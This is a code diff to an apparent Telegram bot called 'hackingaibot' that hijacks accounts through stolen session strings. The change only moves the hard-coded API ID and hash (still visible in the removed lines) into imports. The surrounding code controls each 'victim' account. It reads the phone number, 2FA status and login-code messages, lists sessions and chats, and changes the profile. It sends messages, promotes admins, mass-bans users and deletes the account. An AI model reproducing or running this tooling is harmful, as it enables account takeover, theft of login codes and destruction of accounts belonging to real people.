@@ -36,6 +36,8 @@ from asyncio import sleep
 from io import BytesIO
 from os import remove
 from hackingaibot import BotClient
+from prototype import API_ID, API_HASH
+APIID = str(API_ID)
 
 session = {}
 
@@ -63,7 +65,7 @@ async def _(event):
     session[event.sender_id] = strg
     string = session[event.sender_id]
     mat = "https://t.me/Gladiators_Projects"
-    async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+    async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
       try:
         await victim(functions.channels.JoinChannelRequest(channel=mat))
       except:
@@ -96,7 +98,7 @@ async def _(event):
   else:
     try:
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         xd = await victim.get_me()
         numb = "+" + str(xd.phone)
         await event.reply(numb)
@@ -113,7 +115,7 @@ async def _(event):
   else:
     try:
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         result = (await victim(g())).has_password
         if result is True:
           await event.reply("Yes, There's 2FA Password!!")
@@ -131,7 +133,7 @@ async def _(event):
   else:
     try:
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         async for msg in victim.iter_messages(777000):
           if msg:
             await event.reply(msg)
@@ -162,7 +164,7 @@ async def _(event):
     try:
       mat = str(event.text[7:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim(functions.account.UpdateProfileRequest(
           first_name = mat
         ))
@@ -181,7 +183,7 @@ async def _(event):
       glad = await event.get_reply_message()
       media = await glad.download_media( "hackingaibot/downloads/")
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim(UploadProfilePhotoRequest(
           await victim.upload_file(media)
         ))
@@ -199,7 +201,7 @@ async def _(event):
     try:
       mat = str(event.text[6:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim(functions.account.UpdateProfileRequest(
           last_name = mat
         ))
@@ -217,7 +219,7 @@ async def _(event):
     try:
       mat = str(event.text[10:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim(UpdateUsernameRequest(mat))
       await event.reply("**Changed username successfully!!**")
     except Exception as e:
@@ -233,7 +235,7 @@ async def _(event):
     try:
       mat = str(event.text[7:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim(functions.account.UpdateProfileRequest(
           about = mat
         ))
@@ -251,7 +253,7 @@ async def _(event):
     try:
       mat = str(event.text[8:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim(functions.account.DeleteAccountRequest(
           reason = mat
         ))
@@ -269,7 +271,7 @@ async def _(event):
   else:
     try:
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         xd = await victim.get_me()
         await event.reply(str(xd))
     except Exception as e:
@@ -284,7 +286,7 @@ async def _(event):
   else:
     try:
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         x = []
         result = await victim(GetAuthorizationsRequest())
         for m in result.authorizations:
@@ -309,7 +311,7 @@ async def _(event):
     message_id = event.message.id
     try:
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         dialogs = await victim.get_dialogs()
         gldtr = str(dialogs)
         l = await victim.get_me()
@@ -355,7 +357,7 @@ async def _(event):
       cht = int(lst[0])
       usr = str(lst[1])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         result = await victim.get_participants(mat)
         if not result:
           return await event.reply("It seems like victim is not admin in that group.")
@@ -386,7 +388,7 @@ async def _(event):
       cht = int(dat[0])
       msg = dat[1]
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim.send_message(cht, msg)
       await event.reply("**Sent message successfully!!**")
     except Exception as e:
@@ -411,7 +413,7 @@ async def _(event):
       else:
         rank = "Admin"
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim.edit_admin(chat, user, is_admin=True, anonymous=False, title= rank)
       await event.reply("**Promoted successfully!!**")
     except Exception as e:
@@ -435,7 +437,7 @@ async def _(event):
       else:
         rank = "Admin"
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim.edit_admin(chat, user, is_admin=True, title= rank)
       await event.reply("**Promoted user as anonymous successfully!!**")
     except Exception as e:
@@ -451,7 +453,7 @@ async def _(event):
     try:
       mat = int(event.text[11:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         result = await victim.get_participants(mat)
         if not result:
           return await event.reply("It seems like victim dont have ban users permission in this group.")
@@ -482,7 +484,7 @@ async def _(event):
       if user.isdigit() or user[0] != '@':
         return await event.reply(":Wrong Syntax:\nUse /help command to know syntax.")
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         await victim.edit_admin(chat, user, is_admin=False)
       await event.reply("**Demoted user successfully!!**")
     except Exception as e:
@@ -498,7 +500,7 @@ async def _(event):
     try:
       mat = str(event.text[6:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         try:
           await victim(functions.channels.JoinChannelRequest(channel=mat))
           await event.reply("**Joined successfully!!**")
@@ -517,7 +519,7 @@ async def _(event):
     try:
       mat = str(event.text[7:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         try:
           await victim(ImportChatInviteRequest(mat))
           await event.reply("**Joined successfully!!**")
@@ -536,7 +538,7 @@ async def _(event):
     try:
       mat = int(event.text[7:])
       string = session[event.sender_id]
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         try:
           await victim(LeaveChannelRequest(mat))
           await event.reply("**Left successfully!!**")
@@ -572,7 +574,7 @@ async def _(event):
       string = session[event.sender_id]
       dn = 0
       er = 0
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         async for x in victim.iter_dialogs():
           if x.is_group or x.is_user or x.is_channel:
             try:
@@ -598,7 +600,7 @@ async def _(event):
       string = session[event.sender_id]
       dn = 0
       er = 0
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         usr_id = await victim.get_entity(user)
         user_id = int(usr_id.id)
         async for x in victim.iter_dialogs():
@@ -646,7 +648,7 @@ async def _(event):
       string = session[event.sender_id]
       dn = 0
       er = 0
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         async for x in victim.iter_dialogs():
           if x.is_group or x.is_channel:
             try:
@@ -688,7 +690,7 @@ async def _(event):
       string = session[event.sender_id]
       dn = 0
       er = 0
-      async with TelegramClient(StringSession(string), '16300425', '6c23b156512531c4fdba290e9458b6e4') as victim:
+      async with TelegramClient(StringSession(string), APIID, API_HASH) as victim:
         usr_id = await victim.get_entity(user)
         user_id = int(usr_id.id)
         async for x in victim.iter_dialogs():
